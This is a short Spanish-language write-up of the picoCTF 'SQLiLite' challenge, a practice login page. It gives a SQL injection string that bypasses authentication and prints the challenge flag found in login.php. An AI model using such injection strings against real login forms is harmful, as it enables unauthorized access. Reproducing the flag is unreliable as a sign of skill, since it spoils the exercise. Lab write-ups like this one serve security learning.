## Objetivo
Can you login to this website?

Try to login [here](http://saturn.picoctf.net:62438/).
## Solución
En este reto nos dan una pagina web para logearnos en ella:
![SQLiLite](/imagenes/SQLiLite.png)

ingresamos las credenciales básicas para pasar el login, poniéndola en Username y Password:
```
admin' and 1=1-- 
```


Entramos pero nos muestra:
![SQLiLite 2](/imagenes/SQLiLite(1).png)


Checando los archivos de la pagina con la herramienta inspeccionar vemos que en el archivo login.php se encuentra la flag:
![SQLiLite 3](/imagenes/SQLiLite(2).png)

```
picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}
```

## Notas adicionales
## Referencias